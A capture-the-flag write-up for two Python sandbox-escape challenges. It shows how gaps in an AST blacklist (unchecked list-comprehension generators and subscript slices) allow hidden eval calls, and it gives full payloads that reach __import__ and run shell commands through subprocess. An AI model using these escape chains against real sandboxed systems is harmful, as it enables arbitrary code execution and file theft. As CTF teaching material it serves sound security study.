# PySandbox 1 (misc, 121p, 52 solved)

```
nc pwn1.chal.ctf.westerns.tokyo 30001
```

In the challenge we get access to server which executes provided python code, as long as it passed the [sandbox](sandbox.py).
The sandbox parses the code into AST and then blacklists function calls and attribute access.
So we can for example execute `1+1` or `[1,2,3]` but we can't do `print(1)` or `list('abc')` or `[].len`.

To make it a bit easier to debug locally, we can simply add `print(repr(node))` at the start of `check(node)` function.
This way we will see how the expression we provide was parsed to AST.

The trick here is to notice that the structure used to traverse the AST tree is not complete.
It's visible when compared to the string documenting the tree structure.

For example we can see:

```
 | ListComp(expr elt, comprehension* generators)
 | SetComp(expr elt, comprehension* generators)
 | DictComp(expr key, expr value, comprehension* generators)
```

But in the attributes to parse AST there is only:

```
'ListComp': ['elt'],
'SetComp': ['elt'],
'DictComp': ['key', 'value'],
```

This means that `ListComp` node has parameter `comprehension* generators` which is not checked by the sandbox!

We can verify this simply by sending `[1 for x in [eval('1+1')]]` which shows:

```
[<_ast.Expr object at 0x02938ED0>]
<_ast.Expr object at 0x02938ED0>
<_ast.ListComp object at 0x02938EF0>
<_ast.Num object at 0x02938F10>
```

As expected, the parser did not go into `generators` attribute of `ListComp`, and we could freely invoke code there.
Here for some reason we assummed that `builtins` won't be available (like when you exploit template injections), so we used a classis attribute chain to find `builtins` reference and import function.

We used chain: `().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']`

So the final payload was:

```
[1 for x in [eval("sys.stdout.write(repr([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']('subprocess').check_output('cat flag', shell=True)))")]]
```

And there was `flag` file in the directory: `TWCTF{go_to_next_challenge_running_on_port_30002}`

# PySandbox 2 (misc, 126p, 48 solved)

The second part of the challenge looks very similar, but the vector we used to attack before is patched here.
The idea stays the same, we just need to find another vector, and we find one:

```
| Subscript(expr value, slice slice, expr_context ctx)
```

vs.

```
'Subscript': ['value'],
```

So the list subscript is not validated by the sandbox.
This means now we can just do `[1,2][0 if eval('1+1') is not None else 1]` and we get:

```
[<_ast.Expr object at 0x02648EF0>]
<_ast.Expr object at 0x02648EF0>
<_ast.Subscript object at 0x02648F10>
<_ast.List object at 0x02648F30>
[<_ast.Num object at 0x02648F50>, <_ast.Num object at 0x02648C70>]
<_ast.Num object at 0x02648F50>
<_ast.Num object at 0x02648C70>
1
```

As expected, the check did not venture inside the subscript code, and again we can invoke anything there.
We just re-use the same chain and grab the second flag with:

```
[1,2][0 if eval("sys.stdout.write(repr([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']('subprocess').check_output('cat flag', shell=True)))") is None else 1]
```

And this gives us: `TWCTF{baby_sandb0x_escape_with_pythons}`
